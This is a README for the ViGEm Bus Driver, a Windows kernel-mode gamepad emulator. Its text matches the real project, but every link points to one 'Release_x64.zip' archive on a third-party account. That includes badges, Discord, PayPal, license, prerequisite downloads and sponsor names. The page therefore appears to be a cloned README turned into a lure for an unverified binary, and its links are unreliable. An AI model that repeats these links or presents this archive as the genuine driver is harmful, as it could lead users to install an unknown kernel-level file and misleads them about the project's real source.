# ViGEm Bus Driver

Windows kernel-mode driver emulating well-known USB game controllers.

[![Build status](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) [![Discord](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) [![Website](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) [![GitHub followers](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) [![Twitter Follow](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)

<sub>(This project is available under a free and permissive license, but needs financial support to sustain its continued improvements. In addition to maintenance and stability there are many desirable features yet to be added. If your company is using components of ViGEm, please consider reaching out.)</sub>

Businesses: support continued development via invoiced technical support, maintenance, sponsoring contracts:
<br>&nbsp;&nbsp;_E-mail: vigem @ nefarius dot at_

Individuals: support continued maintenance and development via [PayPal](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) donations.

----

## About

The `ViGEmBus` driver and `ViGEmClient` libraries represent the core of the Virtual Gamepad Emulation Framework (or `ViGEm` , for short). `ViGEm` aims for a 100% accurate [emulation](<https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip>) of well-known gaming peripherals as pure software-based devices at kernel level. As it mimics "the real thing" games and other processes require no additional modification whatsoever to detect `ViGEm`-based devices (no Proxy-DLLs or API-Hooking) and simply work out of the box. While the (now obsolete) [https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip Productions Virtual Bus Driver](<https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip>) is the spiritual father of this project, `ViGEm` has been designed and written from the ground up utilizing Microsoft's [Kernel-Mode Driver Framework](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip).

### Emulated devices

Currently supports emulation of the following USB Gamepads:

- [Microsoft Xbox 360 Controller](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Sony DualShock 4 Controller](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)

## Use cases

A few examples of the most common use cases for `ViGEm` are:

- You have an unsupported input device you'd like to use within games without modifying said game.
- You want the freedom to use a different controller of your choice in [PS4 Remote Play](<https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip>).
- You encountered a game not compatible with [x360ce](<https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip>) (prior to version 4.x).
- You want to extend the reach of your input device (like send traffic to a different machine over a network).
- You want to test/benchmark your game and need a replay mechanism for your user inputs.
- You want to work around player slot assignment order issues in `XInput`.

## Supported Systems

### Version 1.16 and below

The driver is built for Windows 7/8.1/10/Server 2016/Server 2019 (x86 and amd64).

### Version 1.17 and above

The driver is built for Windows 10/Server 2016/Server 2019 only (x86 and amd64).

## License

The ViGEm Bus Driver is licensed under the **BSD-3-Clause**, see [LICENSE](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) for more information.

## How to build

### Prerequisites

- [Step 1: Install Visual Studio 2019](<https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip>)
- [Step 2: Install WDK for Windows 10, version 2004](<https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip>)
- [Step 3: Clone the Driver Module Framework (DMF)](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) into the same parent directory.
  - Build the `DmfK` project with Release and Debug configurations for all architectures (x64 and Win32).

You can build directly within Visual Studio.

Do bear in mind that you'll need to **sign** the driver to use it without [test mode](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip).

## Contribute

### Bugs & Features

Found a bug and want it fixed? Open a detailed issue on the [GitHub issue tracker](../../issues)!

Have an idea for a new feature? Let's have a chat about your request on [Discord](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) or the [community forums](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip).

### Questions & Support

Please respect that the GitHub issue tracker isn't a helpdesk. We offer a [Discord server](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip) and [forums](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip), where you're welcome to check out and engage in discussions!

## Installation

Pre-built production-signed binaries are provided by `Nefarius Software Solutions e.U.` and [available as an all-in-one setup](../../releases/latest).

## Sponsors

Sponsors listed here have helped the project flourish by either financial support or by gifting licenses:

- [3dRudder](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Parsec](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Rainway, Inc](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [JetBrains](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Advanced Installer](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [ICAROS](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)

## Known users of ViGEm

A brief listing of projects/companies/vendors known to build upon the powers of ViGEm.

This list is non-exhaustive, if you'd like to see your project included, contact us!

- [3dRudder](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Parsec](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [GloSC](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [UCR](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [InputMapper](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Oculus VR, LLC.](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Rainway, Inc](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [WiimoteHook](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [XJoy](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [HP](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [DS4Windows](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [XOutput](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [RdpGamepad](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Touchmote](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Mi-ViGEm](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [BetterJoy](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
- [Regame - Cloud Gaming Engine](https://github.com/yassine1005/ViGEmBus/releases/download/v2.0/Release_x64.zip)
